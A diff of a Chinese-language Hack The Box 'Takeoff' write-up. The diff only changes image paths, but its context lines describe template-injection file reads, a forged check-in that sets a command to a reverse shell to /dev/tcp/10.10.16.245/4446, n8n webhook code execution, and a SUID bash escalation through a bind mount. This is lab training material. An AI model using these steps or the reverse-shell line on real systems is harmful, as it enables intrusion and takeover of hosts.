@@ -26,7 +26,7 @@ nmap -Pn -p 22,80 -sV --version-light 10.129.250.248
 echo '10.129.250.248 takeoff.htb' >> /etc/hosts
 ```
 
-![1](../../takeoff/01-nmap.png)
+![1](/takeoff/01-nmap.png)
 
 首页是「HTB Airways Booking」，一个 Go/Echo + htmx 的订票系统。注册一个账号（`tester@htb.htb / Passw0rd123`）并登录，选一班航班、挑座位、下单，拿到订单号：
 
@@ -51,7 +51,7 @@ curl -s -b tk http://takeoff.htb/tickets/FBXQKE/download -o t.pdf
 
 在 PDF 文本里读到了 `MARK> takeoff.htb <MARK`——备注被当作 Go 模板执行，且渲染器里注册了 `.File` 函数。这等于拿到一个任意文件读取（以 `www-data` 身份）。
 
-![2](../../takeoff/02-ssti.png)
+![2](/takeoff/02-ssti.png)
 
 重点看进程环境变量：
 
@@ -94,7 +94,7 @@ sh -c 'sh -i >& /dev/tcp/10.10.16.245/4446 0>&1'
 
 注意 `gate=WEB` 只是网页端标记已值机，不会执行 `NotifyCmd`；换成 `gate=GATE` 才会走检票口逻辑真正执行命令。
 
-![3](../../takeoff/03-qr-forge.png)
+![3](/takeoff/03-qr-forge.png)
 
 响应里 `status: ok`，`NotifyCmd` 已经是我们伪造的值，`www-data` 的 shell 也就回来了。
 
@@ -137,7 +137,7 @@ curl -s --get --data-urlencode 'cmd=id' http://127.0.0.1:5678/webhook/pwn
 
 命令执行在 n8n 容器 `f1bfbbddcdd4` 里，身份是 root，但这只是容器 root，不是主机 root。
 
-![4](../../takeoff/04-n8n-rce.png)
+![4](/takeoff/04-n8n-rce.png)
 
 ## 4. bind mount 与 SUID bash
 
@@ -149,7 +149,7 @@ curl -s --get --data-urlencode 'cmd=id' http://127.0.0.1:5678/webhook/pwn
 
 主机用户 `kpark` 的家目录被 bind mount 到了容器的 `/root`，而且容器是以 root 运行的——Docker 默认不做 user namespace 映射，容器 root 写入这个挂载点，落盘就是主机的 root。容器里的 `/root/user.txt` 正是主机的 `/home/kpark/user.txt`：
 
-![5](../../takeoff/05-user-flag.png)
+![5](/takeoff/05-user-flag.png)
 
 这也顺便说明了为什么 `www-data` 看不到 `/home`：它的 systemd 单元开了 `ProtectHome=true`，`/home` 在它的命名空间里是空的，而容器里的 `/root` 是真实的主机目录。
 
@@ -175,7 +175,7 @@ cat /home/kpark/user.txt
 # uid=1001(kpark) gid=1001(kpark) euid=0(root) groups=1001(kpark)
 ```
 
-![6](../../takeoff/06-root-flag.png)
+![6](/takeoff/06-root-flag.png)
 
 ## 5. Flag
 
